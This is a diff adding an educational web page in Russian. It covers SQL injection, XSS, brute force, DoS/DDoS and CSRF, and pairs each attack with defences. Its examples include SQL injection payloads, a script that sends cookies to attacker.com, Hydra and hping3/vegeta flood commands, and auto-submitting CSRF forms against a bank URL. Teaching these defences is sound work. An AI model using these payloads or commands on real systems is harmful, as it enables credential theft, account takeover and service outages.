@@ -1,0 +1,530 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link
+            rel="stylesheet"
+            href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css"
+        />
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+        <link rel="stylesheet" href="./css/main.css" />
+        <title>Главная</title>
+    </head>
+    <body>
+        <!-- Wrapper -->
+
+        <div class="wrapper">
+            <header class="header">
+    <div class="container">
+        <a href="/" class="logo header__logo"> TEMI </a>
+
+        <a href="#" class="header__github">
+            <img src="https://img.icons8.com/ios7/600/FFFFFF/github.png" />
+        </a>
+    </div>
+</header>
+
+
+            <div class="content-wrap container">
+                <aside class="sidebar">
+    <nav>
+        <ul class="sidebar__list">
+            <li>
+                <a href="#sql" class="sidebar__link"> SQL-Injection </a>
+            </li>
+            <li>
+                <a href="#xss" class="sidebar__link"> XSS </a>
+            </li>
+            <li>
+                <a href="#bruteforce" class="sidebar__link"> BruteForce </a>
+            </li>
+            <li>
+                <a href="#dos" class="sidebar__link"> DOS/DDOS </a>
+            </li>
+            <li>
+                <a href="#csrf" class="sidebar__link"> CSRF </a>
+            </li>
+        </ul>
+    </nav>
+</aside>
+
+                <main class="main"><div class="home">
+        <section id="sql" class="content">
+            <h2>SQL-инъекции (SQL Injection)</h2>
+
+            <p>
+                <strong>SQL-инъекция</strong> — это уязвимость, возникающая,
+                когда злоумышленник может внедрить вредоносный SQL-код в запрос
+                к базе данных. Это позволяет выполнять несанкционированные
+                операции, такие как кража данных, удаление таблиц или обход
+                аутентификации.
+            </p>
+
+            <h3>Как это работает?</h3>
+            <p>
+                Типичный пример уязвимости — подстановка зловредных данных в
+                поле ввода:
+            </p>
+
+            <pre><code class="language-sql">-- Исходный запрос (уязвимый)
+SELECT * FROM users WHERE username = '$username' AND password = '$password';
+
+-- Если ввести в поле username: admin' --
+-- Итоговый запрос:
+SELECT * FROM users WHERE username = 'admin' -- ' AND password = '';
+-- Комментарий (--) отключает проверку пароля!</code></pre>
+
+            <h3>Последствия SQL-инъекций</h3>
+            <ul>
+                <li>
+                    Кража конфиденциальных данных (логины, пароли, платежные
+                    данные)
+                </li>
+                <li>Удаление или изменение данных в базе</li>
+                <li>Обход аутентификации (вход в систему без пароля)</li>
+                <li>Выполнение команд на сервере (в некоторых СУБД)</li>
+            </ul>
+
+            <h3>Как защититься?</h3>
+            <ol>
+                <li>
+                    <strong style="margin-bottom: 1rem"
+                        >Используйте подготовленные выражения (Prepared
+                        Statements)</strong
+                    >
+                    <pre><code class="language-php">// PHP + MySQLi
+$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
+$stmt->bind_param("ss", $username, $password);
+$stmt->execute();</code></pre>
+                </li>
+
+                <li>
+                    <strong style="margin-bottom: 1rem"
+                        >Экранируйте входные данные</strong
+                    >
+                    (если prepared statements недоступны)
+                    <pre><code class="language-php">// PHP
+$username = mysqli_real_escape_string($conn, $_POST['username']);</code></pre>
+                </li>
+
+                <li>
+                    <strong>Ограничивайте права доступа</strong> к базе данных
+                    (принцип минимальных привилегий)
+                </li>
+
+                <li>
+                    <strong>Валидируйте входные данные</strong> (белые списки
+                    символов, регулярные выражения)
+                </li>
+            </ol>
+
+            <h3>Пример эксплойта</h3>
+            <p>
+                Вот как злоумышленник может использовать уязвимость для кражи
+                данных:
+            </p>
+
+            <pre><code class="language-sql">-- Ввод в поле "username":
+' UNION SELECT username, password FROM users WHERE '1'='1
+
+-- Итоговый запрос:
+SELECT * FROM users WHERE username = '' 
+UNION SELECT username, password FROM users WHERE '1'='1';</code></pre>
+
+            <p>
+                Это выведет все логины и пароли из таблицы users, так как
+                условие <code>'1'='1'</code> всегда истинно.
+            </p>
+        </section>
+
+        <section id="xss" class="content">
+    <h2>Межсайтовый скриптинг (XSS)</h2>
+    
+    <p>
+        <strong>XSS (Cross-Site Scripting)</strong> — это уязвимость, позволяющая злоумышленнику внедрять 
+        вредоносные JavaScript-скрипты на страницы вашего сайта. Эти скрипты выполняются в браузерах 
+        других пользователей, что может привести к краже данных, подмене контента или распространению вредоносного ПО.
+    </p>
+
+    <h3>Типы XSS-атак</h3>
+    <ul>
+        <li>
+            <strong>Reflected XSS</strong> — скрипт попадает на страницу через параметры URL 
+            (например, в результатах поиска или ошибках)
+        </li>
+        <li>
+            <strong>Stored XSS</strong> — скрипт сохраняется на сервере (в комментариях, сообщениях) 
+            и выполняется у всех пользователей
+        </li>
+        <li>
+            <strong>DOM-based XSS</strong> — уязвимость существует только в клиентском коде без 
+            участия сервера
+        </li>
+    </ul>
+
+    <h3>Как это работает?</h3>
+    <p>Пример уязвимого кода, который выводит пользовательский ввод без обработки:</p>
+
+    <pre><code class="language-html">&lt;!-- Уязвимый код --&gt;
+&lt;div&gt;
+    Привет, &lt;?php echo $_GET['name']; ?&gt;!
+&lt;/div&gt;
+
+&lt;!-- Если в URL будет: ?name=&lt;script&gt;alert('XSS')&lt;/script&gt; --&gt;
+&lt;!-- На странице выполнится JavaScript! --&gt;</code></pre>
+
+    <h3>Последствия XSS-атак</h3>
+    <ul>
+        <li>Кража cookies и сессионных токенов</li>
+        <li>Подмена содержимого страницы (фишинг)</li>
+        <li>Перенаправление на вредоносные сайты</li>
+        <li>Загрузка и выполнение вредоносного ПО</li>
+        <li>Кейлоггинг (перехват нажатий клавиш)</li>
+    </ul>
+
+    <h3>Как защититься?</h3>
+    <ol>
+        <li>
+            <strong style="margin-bottom: 1rem;">Экранирование HTML-сущностей</strong>
+            <pre><code class="language-php">// PHP
+echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');
+
+// JavaScript (Node.js)
+const escaped = userInput.replace(/&/g, "&amp;")
+                         .replace(/</g, "&lt;")
+                         .replace(/>/g, "&gt;");</code></pre>
+        </li>
+        
+        <li>
+            <strong style="margin-bottom: 1rem;">Content Security Policy (CSP)</strong>
+            <pre><code class="language-html">&lt;meta http-equiv="Content-Security-Policy" 
+      content="default-src 'self'; script-src 'self' https://trusted.cdn.com"&gt;</code></pre>
+        </li>
+        
+        <li>
+            <strong style="margin-bottom: 1rem;">HttpOnly и Secure флаги для кук</strong>
+            <pre><code class="language-php">// PHP
+setcookie('sessionID', $token, [
+    'httponly' => true,
+    'secure' => true,
+    'samesite' => 'Strict'
+]);</code></pre>
+        </li>
+        
+        <li>
+            <strong style="margin-bottom: 1rem;">Безопасные API для работы с DOM</strong>
+            <pre><code class="language-javascript">// Небезопасно:
+element.innerHTML = userInput;
+
+// Безопасно:
+element.textContent = userInput;
+// или
+document.createTextNode(userInput);</code></pre>
+        </li>
+    </ol>
+
+    <h3>Пример эксплойта</h3>
+    <p>Как злоумышленник может украсть cookies через XSS:</p>
+    
+    <pre><code class="language-html">&lt;script&gt;
+fetch('https://attacker.com/steal?data=' + document.cookie);
+&lt;/script&gt;</code></pre>
+
+    <p>
+        Если этот код попадет на страницу (например, через комментарий), браузер отправит 
+        все cookies пользователя на сервер злоумышленника.
+    </p>
+
+    <h3>Дополнительные меры защиты</h3>
+    <ul>
+        <li>Использование X-XSS-Protection заголовка (для старых браузеров)</li>
+        <li>Валидация и санитизация всех пользовательских данных</li>
+        <li>Ограничение использования eval(), setTimeout() с строковыми параметрами</li>
+        <li>Регулярное обновление библиотек и фреймворков</li>
+    </ul>
+</section>
+
+<section id="bruteforce" class="content">
+    <h2>Атаки методом Brute Force</h2>
+    
+    <p>
+        <strong>Brute Force (перебор)</strong> — это метод взлома, при котором злоумышленник систематически проверяет все возможные комбинации 
+        логина/пароля, пока не найдет правильную. Современные ботнеты могут осуществлять миллионы попыток в минуту.
+    </p>
+
+    <h3>Как это работает?</h3>
+    <p>
+        Типичный сценарий атаки на форму входа:
+    </p>
+
+    <pre><code class="language-http">POST /login HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&password=123456</code></pre>
+
+    <h3>Основные цели атак</h3>
+    <ul>
+        <li>Формы входа (логины администраторов)</li>
+        <li>API-эндпоинты авторизации</li>
+        <li>Зашифрованные файлы/архивы</li>
+        <li>SSH/RDP/VPN-доступы</li>
+    </ul>
+
+    <h3>Как защититься?</h3>
+    <ol>
+        <li>
+            <strong style="margin-bottom: 1rem; display: inline-block;">Ограничение попыток входа</strong>
+            <pre><code class="language-php">// PHP-реализация блокировки после 5 попыток
+if ($_SESSION['login_attempts'] >= 5) {
+    die('Превышено число попыток. Попробуйте через 15 минут.');
+}</code></pre>
+        </li>
+        
+        <li>
+            <strong style="margin-bottom: 1rem; display: inline-block;">Капча (reCAPTCHA v3)</strong>
+            <pre><code class="language-html">&lt;script src="https://www.google.com/recaptcha/api.js"&gt;&lt;/script&gt;
+&lt;input type="hidden" name="recaptcha_response" id="recaptchaResponse"&gt;
+
+&lt;script&gt;
+grecaptcha.ready(function() {
+    grecaptcha.execute('SITE_KEY', {action: 'login'});
+});
+&lt;/script&gt;</code></pre>
+        </li>
+        
+        <li>
+            <strong style="margin-bottom: 1rem; display: inline-block;">Задержка между попытками</strong>
+            <pre><code class="language-javascript">// Node.js: искусственная задержка 2 секунды
+app.post('/login', async (req, res) => {
+    await new Promise(resolve => setTimeout(resolve, 2000));
+    // Проверка логина/пароля
+});</code></pre>
+        </li>
+        
+        <li>
+            <strong style="margin-bottom: 1rem; display: inline-block;">Двухфакторная аутентификация (2FA)</strong>
+            <pre><code class="language-php">// Генерация и отправка кода
+$code = rand(100000, 999999);
+$_SESSION['2fa_code'] = password_hash($code, PASSWORD_DEFAULT);
+// Отправка SMS/email с кодом</code></pre>
+        </li>
+    </ol>
+
+    <h3>Пример атаки через Hydra</h3>
+    <p>Как злоумышленник может использовать инструмент для автоматизации:</p>
+    
+    <pre><code class="language-bash">hydra -l admin -P passwords.txt example.com http-post-form "/login:username=^USER^&password=^PASS^:F=Неверный пароль"</code></pre>
+
+    <h3>Дополнительные меры</h3>
+    <ul>
+        <li>Блокировка IP после серии неудачных попыток</li>
+        <li>Использование "медовых ловушек" (fake admin pages)</li>
+        <li>Мониторинг подозрительной активности (например, 100+ попыток в минуту)</li>
+    </ul>
+</section>
+
+<section id="dos" class="content">
+    <h2>Атаки типа DoS/DDoS</h2>
+    
+    <p>
+        <strong>DoS (Denial of Service)</strong> и <strong>DDoS (Distributed Denial of Service)</strong> — это атаки, направленные на перегрузку ресурсов системы, чтобы сделать её недоступной для легитимных пользователей.
+    </p>
+
+    <h3>Основные типы атак</h3>
+    <ul>
+        <li><strong>Объёмные атаки</strong> - переполнение канала связи (UDP/ICMP флуд)</li>
+        <li><strong>Атаки на уровень приложений</strong> - HTTP флуд, медленные атаки (Slowloris)</li>
+        <li><strong>Атаки на протоколы</strong> - SYN флуд, DNS amplification</li>
+    </ul>
+
+    <h3>Как это работает?</h3>
+    <p>Пример SYN-флуда:</p>
+    <pre><code class="language-bash"># Использование hping3 для SYN-флуда
+hping3 -S --flood -V -p 80 target.com</code></pre>
+
+    <h3>Последствия успешной атаки</h3>
+    <ul>
+        <li>Полная недоступность сервиса</li>
+        <li>Финансовые потери из-за простоя</li>
+        <li>Репутационный ущерб</li>
+        <li>Возможность маскировки других атак</li>
+    </ul>
+
+    <h3>Как защититься?</h3>
+    <ol>
+        <li>
+            <strong style="margin-bottom: 1rem; display: inline-block;">Ограничение запросов (Rate Limiting)</strong>
+            <pre><code class="language-nginx"># Nginx конфигурация
+limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;
+
+server {
+    location / {
+        limit_req zone=one burst=20;
+    }
+}</code></pre>
+        </li>
+        
+        <li>
+            <strong style="margin-bottom: 1rem; display: inline-block;">Использование CDN и DDoS-защиты</strong>
+            <pre><code class="language-text">Рекомендуемые сервисы:
+- Cloudflare
+- AWS Shield
+- Akamai Prolexic
+- Qrator Networks</code></pre>
+        </li>
+        
+        <li>
+            <strong style="margin-bottom: 1rem; display: inline-block;">Настройка фаервола</strong>
+            <pre><code class="language-bash"># Блокировка IP с большим числом соединений
+iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 50 -j DROP</code></pre>
+        </li>
+        
+        <li>
+            <strong style="margin-bottom: 1rem; display: inline-block;">Оптимизация сервера</strong>
+            <pre><code class="language-apache"># Apache настройки для защиты от Slowloris
+Timeout 30
+KeepAlive On
+MaxKeepAliveRequests 100
+KeepAliveTimeout 5</code></pre>
+        </li>
+    </ol>
+
+    <h3>Пример HTTP-флуда</h3>
+    <p>Использование инструмента для генерации запросов:</p>
+    <pre><code class="language-bash"># Использование vegeta для нагрузочного тестирования
+echo "GET http://target.com" | vegeta attack -rate=1000 -duration=1m</code></pre>
+
+    <h3>Дополнительные меры защиты</h3>
+    <ul>
+        <li>Гео-фильтрация трафика</li>
+        <li>Регулярное обновление ПО</li>
+        <li>Мониторинг необычной активности</li>
+        <li>Резервные каналы связи</li>
+    </ul>
+
+    <h3>Что делать при атаке?</h3>
+    <ol>
+        <li>Активировать план реагирования на инциденты</li>
+        <li>Уведомить провайдера и службу безопасности</li>
+        <li>Перенаправить трафик через защитные решения</li>
+        <li>Собрать доказательства для последующего расследования</li>
+    </ol>
+</section>
+
+<section id="csrf" class="content">
+    <h2>Межсайтовая подделка запроса (CSRF)</h2>
+    
+    <p>
+        <strong>CSRF (Cross-Site Request Forgery)</strong> — это атака, при которой злоумышленник заставляет браузер жертвы выполнять нежелательные действия на доверенном сайте, где пользователь аутентифицирован.
+    </p>
+
+    <h3>Как это работает?</h3>
+    <p>Типичный сценарий CSRF-атаки:</p>
+    <ol>
+        <li>Пользователь входит на банковский сайт (сохраняются куки сессии)</li>
+        <li>Пользователь посещает вредоносный сайт</li>
+        <li>Сайт автоматически отправляет запрос на банковский сайт для перевода денег</li>
+    </ol>
+
+    <pre><code class="language-html">&lt;!-- Вредоносная страница --&gt;
+&lt;img src="https://bank.com/transfer?to=hacker&amount=1000" width="0" height="0"&gt;</code></pre>
+
+    <h3>Условия для успешной CSRF</h3>
+    <ul>
+        <li>Жертва аутентифицирована на целевом сайте</li>
+        <li>Целевой сайт полагается только на куки для аутентификации</li>
+        <li>Запросы не требуют специальных заголовков или токенов</li>
+    </ul>
+
+    <h3>Как защититься?</h3>
+    <ol>
+        <li>
+            <strong style="margin-bottom: 1rem; display: inline-block;">CSRF-токены</strong>
+            <pre><code class="language-php">// Генерация токена
+$_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+
+// Вставка в форму
+&lt;input type="hidden" name="csrf_token" value="&lt;?= $_SESSION['csrf_token'] ?&gt;"&gt;
+
+// Проверка при обработке формы
+if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
+    die('Неверный CSRF-токен');
+}</code></pre>
+        </li>
+        
+        <li>
+            <strong style="margin-bottom: 1rem; display: inline-block;">SameSite cookies</strong>
+            <pre><code class="language-php">// Установка куки с атрибутом SameSite
+setcookie('sessionID', $token, [
+    'samesite' => 'Strict',
+    'secure' => true,
+    'httponly' => true
+]);</code></pre>
+        </li>
+        
+        <li>
+            <strong style="margin-bottom: 1rem; display: inline-block;">Проверка заголовков Origin/Referer</strong>
+            <pre><code class="language-php">// Проверка заголовка Origin
+$allowedOrigins = ['https://yourdomain.com'];
+if (!in_array($_SERVER['HTTP_ORIGIN'], $allowedOrigins)) {
+    die('Неверный источник запроса');
+}</code></pre>
+        </li>
+        
+        <li>
+            <strong style="margin-bottom: 1rem; display: inline-block;">Двойное подтверждение для критичных операций</strong>
+            <pre><code class="language-javascript">// Требование повторного ввода пароля
+function confirmTransfer() {
+    const password = prompt('Подтвердите пароль');
+    if (!password) return false;
+    // Проверка пароля через AJAX
+}</code></pre>
+        </li>
+    </ol>
+
+    <h3>Пример CSRF-атаки на форму</h3>
+    <pre><code class="language-html">&lt;form action="https://bank.com/transfer" method="POST" id="csrf-form"&gt;
+    &lt;input type="hidden" name="to" value="hacker"&gt;
+    &lt;input type="hidden" name="amount" value="1000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('csrf-form').submit();&lt;/script&gt;</code></pre>
+
+    <h3>Дополнительные меры защиты</h3>
+    <ul>
+        <li>Ограничение времени жизни сессий</li>
+        <li>Использование CAPTCHA для важных операций</li>
+        <li>Логирование подозрительных запросов</li>
+        <li>Регулярное обучение пользователей</li>
+    </ul>
+
+    <h3>Популярные уязвимые действия</h3>
+    <ul>
+        <li>Изменение email/пароля пользователя</li>
+        <li>Финансовые транзакции</li>
+        <li>Публикация контента от имени пользователя</li>
+        <li>Изменение настроек безопасности</li>
+    </ul>
+</section>
+</div>
+</main>
+            </div>
+
+            <footer class="footer">
+    <div class="container">
+        
+    </div>
+</footer>
+
+        </div>
+
+        <!-- Wrapper End -->
+
+        <script src="./js/index.bundle.js"></script>
+        <script>
+            hljs.highlightAll();
+        </script>
+    </body>
+</html>
